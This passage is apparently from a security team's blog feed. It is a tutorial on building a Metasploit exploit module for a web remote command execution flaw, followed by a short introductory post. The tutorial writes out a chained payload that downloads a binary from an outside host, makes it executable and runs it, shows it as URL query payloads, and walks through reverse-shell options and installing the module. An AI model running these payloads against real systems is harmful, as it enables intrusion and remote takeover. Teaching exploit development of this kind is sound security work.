<p><span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #0000ff;">Remote</span>::<span style="color: #008000;">HttpClient</span>&nbsp;, is what we&#8217;ll be using to poke the target and have it request a file from us.<br />
<span style="color: #008000;">HttpClient</span>&nbsp;will introduce you to four&nbsp;extra Opts &#8211; <strong>RHOST,</strong>&nbsp;<strong>RPORT,SSL and VHOST &#8211;</strong>&nbsp;which will be used to define which server and port we want use to send the HTTP requests to and <strong>VHOST</strong> for defining what kind of <em>HTTP Host</em>-header we want to use. The <strong>SSL</strong> Opt is a boolean defining whether or not the client connection is encrypted.<br />
Above, I gave you an example of running a &#8216;<strong><em>hostname</em></strong>&#8216; command on the vulnerable server, which would likely be of no benefit to the attacker.<br />
For this case, I would use a chained command that would firstly download my evil binary payload, give it execute permissions and then run it&#8230;<br />
&#8230;like &#8216;<em><strong>wget 10.0.0.1/evil -O /tmp/evil;chmod 777 /tmp/evil;/tmp/evil</strong></em>&#8216;<br />
In a HTTP Request, it would look something like this</p>
<blockquote><p>https://rot.fi/vulnerable_url.php?<strong>cmd</strong>=<span style="color: #ff0000;"><em><strong>wget 10.0.0.1/evil -O /tmp/evil</strong></em></span><br />
https://rot.fi/vulnerable_url.php?<strong>cmd=</strong><span style="color: #ff0000;"><em><strong>chmod 777 /tmp/evil<br />
</strong></em></span><br />
https://rot.fi/vulnerable_url.php?<strong>cmd</strong><strong>=</strong><span style="color: #ff0000;"><em><strong>/tmp/evil</strong></em></span></p></blockquote>
<h1>HereToServe()</h1>
<p><span style="color: #0000ff;">Msf</span>::<span style="color: #ff0000;">Exploit</span>::<span style="color: #0000ff;">Remote</span>::<span style="color: #008000;">HttpServer</span>::<span style="color: #0000ff;">HTML<span style="color: #333333;">, is what we use to deliver requested the payload.</span></span><br />
The <span style="color: #008000;">HttpServer</span>&nbsp;will introduce you to two extra Opts, <strong>SRVHOST</strong> and <strong>SRVPORT</strong> and it has two key functions you need to notice. The Opts will define which IP and port the HttpServer will bind to.</p>
<h2><span style="color: #808000;">def</span> <strong>primer</strong></h2>
<p>What is defined here runs when the <span style="color: #808000;">HttpServer</span> is started but still before any connections are accepted in.<br />
We don&#8217;t need to do anything here, this time.</p>
<h2><span style="color: #808000;">def</span> <strong>on_request_uri(cli, req)</strong></h2>
<p>This function is called each time a request comes in.<br />
What is noteworthy is that the <strong>on_request_uri</strong> is called when the exact <em>URI</em> is called, which we will be defining later in the module.<br />
In this function I&#8217;m generating the binary payload on each request and sending it back to the client.<br />
What the payload will contain, will be the one you choose while configuring the exploit.<br />
<img decoding="async" class=" size-full wp-image-568 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/on_request.jpg" alt="on_request.JPG" width="460" height="117" srcset="/wp-content/uploads/2017/02/on_request.jpg 460w, /wp-content/uploads/2017/02/on_request-300x76.jpg 300w" sizes="(max-width: 460px) 100vw, 460px" /></p>
<h1>Initialize()</h1>
<p>For an exploit module, you need to define a target, and the <strong>register_options</strong> are used by the HTTP Server library.<br />
In the initialize function you also define the Name, Author and License for your creation, among other things. For a BufferOverflow exploit, you&#8217;d define bad characters and usually multiple targets like kernel versions and such.<br />
Also, notice that the <strong>register_options</strong> Opts are typecasted, to strings, integers, etc..<br />
<img decoding="async" class=" size-full wp-image-543 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/initialize.jpg" alt="initialize" width="751" height="444" srcset="/wp-content/uploads/2017/02/initialize.jpg 751w, /wp-content/uploads/2017/02/initialize-300x177.jpg 300w, /wp-content/uploads/2017/02/initialize-705x417.jpg 705w" sizes="(max-width: 751px) 100vw, 751px" /></p>
<h1>Code()</h1>
<p>A Metasploit Exploit will be using a exploit and check functions.</p>
<h2><strong><span style="color: #808000;">def</span> check</strong></h2>
<p>This function is supposed to be used to check if the target is vulnerable. Sometimes its not even possible but its best to have even partial check than to launch an exploit script against a target that&#8217;s not even online.<br />
<img decoding="async" class=" size-full wp-image-555 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/check.jpg" alt="check" width="472" height="248" srcset="/wp-content/uploads/2017/02/check.jpg 472w, /wp-content/uploads/2017/02/check-300x158.jpg 300w" sizes="(max-width: 472px) 100vw, 472px" /><br />
The above check function sends a GET request at the <strong>RHOST </strong>and checks if the HTTP return code is OK or not.<br />
Based on the HTTP code, we return a Vulnerable or a Safe status to the exploit module.</p>
<h2><strong><span style="color: #808000;">def</span> exploit</strong></h2>
<p>In most cases, this is where the magic happens.<br />
You can rewrite <strong>Opts</strong> by manipulating the <strong>datastore[]</strong> array.<br />
The <span style="color: #008000;">HTTPServer</span> is started as a new instance with the <strong><span style="color: #000000;">start_service()</span></strong> function.<br />
By&nbsp;setting <strong>SSL</strong> <strong>Opt</strong> to <span style="color: #808000;">true</span>/<span style="color: #808000;">false</span>&nbsp;you can choose whether you want to start&nbsp;the <span style="color: #008000;">HTTPServer</span>&nbsp;with Transport Layer Security.<br />
<img decoding="async" class=" size-full wp-image-556 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/exploit.jpg" alt="exploit" width="541" height="463" srcset="/wp-content/uploads/2017/02/exploit.jpg 541w, /wp-content/uploads/2017/02/exploit-300x257.jpg 300w" sizes="(max-width: 541px) 100vw, 541px" /><br />
I&#8217;ve put in a <strong>sleep(150)&nbsp;</strong>because sometime it takes time for the victim to execute the payload, so we don&#8217;t want our script to die before that happens.<br />
The actual exploitation takes place in the <strong>request</strong> function</p>
<h2><strong><span style="color: #808000;">def</span> request</strong></h2>
<p><img decoding="async" class=" size-full wp-image-557 aligncenter" src="http://165.232.69.132/wp-content/uploads/2017/02/request.jpg" alt="request" width="538" height="266" srcset="/wp-content/uploads/2017/02/request.jpg 538w, /wp-content/uploads/2017/02/request-300x148.jpg 300w" sizes="(max-width: 538px) 100vw, 538px" /></p>
<h1>What now?</h1>
<p>So whats really cool about a exploit module like this, is that you get it all &nbsp;in the Swiss army knife we call Metasploit Framework.<br />
Instead of using this module, we could do the same manually:</p>
<ol>
<li>Setup and configure an Apache Web server</li>
<li>Create a binary payload with <strong>msfvenom</strong> manually</li>
<li>Setup a Listener / &nbsp;Handler to grab the shell</li>
<li>Trigger the vulnerability with curl/wget</li>
</ol>
<p>Yes, I guess if you compare the time it takes to develop a working module to the time it takes to do the above four steps, the latter wins.<br />
Let me demonstrate you how this is exploited via the working module.<br />
Firstly, you need to download and add the module to Metasploit</p>
<pre>git clone https://github.com/jake08/Metasploit
mv Metasploit/rot_rce.rb /usr/share/metasploit-framework/modules/exploits/linux/http</pre>
<p>Then start up msfconsole and find the module</p>
<blockquote>
<h6>msfconsole<br />
search rot_rce</h6>
<p><img decoding="async" class="alignnone size-full wp-image-612" src="http://165.232.69.132/wp-content/uploads/2017/02/msfsearch.jpg" alt="msfsearch" width="838" height="222" srcset="/wp-content/uploads/2017/02/msfsearch.jpg 838w, /wp-content/uploads/2017/02/msfsearch-300x79.jpg 300w, /wp-content/uploads/2017/02/msfsearch-768x203.jpg 768w, /wp-content/uploads/2017/02/msfsearch-705x187.jpg 705w" sizes="(max-width: 838px) 100vw, 838px" /></p></blockquote>
<p>Then use and set it up according to your network<br />
here&#8217;s a friendly &nbsp;reminder what&#8217;s what:</p>
<ul>
<li>RHOST =&gt; Target Host that has the RCE Vulnerability</li>
<li>RPORT =&gt; Target Port for the above server</li>
<li>SRVHOST =&gt; The IP for the Local HTTP Server, make sure its reachable by RHOST</li>
<li>SRVPORT =&gt; Port for the above Server</li>
<li>VHOST =&gt; Virtual Host, or HTTP Host-header for RHOST eg. amazon.com, rot.fi</li>
<li>WRITABLEDIR =&gt; A Directory on the RHOST where we can drop the payload</li>
<li>PAYLOAD =&gt; Your friendly neighborhood reverse shell</li>
<li>LHOST =&gt; Return IP for the reverse shell, make sure its reachable by RHOST</li>
<li>LPORT =&gt; Port for above server</li>
</ul>
<blockquote><p><img decoding="async" class="alignnone size-full wp-image-627" src="http://165.232.69.132/wp-content/uploads/2017/02/setupexploit1.jpg" alt="setupexploit" width="843" height="705" srcset="/wp-content/uploads/2017/02/setupexploit1.jpg 843w, /wp-content/uploads/2017/02/setupexploit1-300x251.jpg 300w, /wp-content/uploads/2017/02/setupexploit1-768x642.jpg 768w, /wp-content/uploads/2017/02/setupexploit1-705x590.jpg 705w" sizes="(max-width: 843px) 100vw, 843px" /></p></blockquote>
<p>Run check and&nbsp;exploit for profit.<a href="https://github.com/jake08/Metasploit/blob/master/rot_rce.rb"><br />
</a></p>
<blockquote><p><img decoding="async" class="alignnone size-full wp-image-625" src="http://165.232.69.132/wp-content/uploads/2017/02/msfexploit.jpg" alt="msfexploit.JPG" width="646" height="474" srcset="/wp-content/uploads/2017/02/msfexploit.jpg 646w, /wp-content/uploads/2017/02/msfexploit-300x220.jpg 300w" sizes="(max-width: 646px) 100vw, 646px" /></p></blockquote>
<h1></h1>
<h2>Additional resources</h2>
<p><a href="https://github.com/jake08/Metasploit/blob/master/rot_rce.rb">Complete module code</a><br />
<a href="http://www.rubydoc.info/github/rapid7/metasploit-framework/">More on Metasploit Module development<br />
</a></p>
<p><strong>Logout</strong><br />
j3k, hacker</p>
]]></content:encoded>
					
					<wfw:commentRss>/how-to-metasploit-exploit-development/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Hello world</title>
		<link>/first-blog-post/</link>
					<comments>/first-blog-post/#respond</comments>
		
		<dc:creator><![CDATA[putsi]]></dc:creator>
		<pubDate>Mon, 16 Jan 2017 09:56:22 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">https://rotfi.wordpress.com/?p=4</guid>

					<description><![CDATA[First post of the RoT Team Blog.]]></description>
										<content:encoded><![CDATA[<p>Let&#8217;s try doing some public disclosures and CTF writeups here.<br />
Posts are written by members of team ROT.</p>
]]></content:encoded>
					
					<wfw:commentRss>/first-blog-post/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
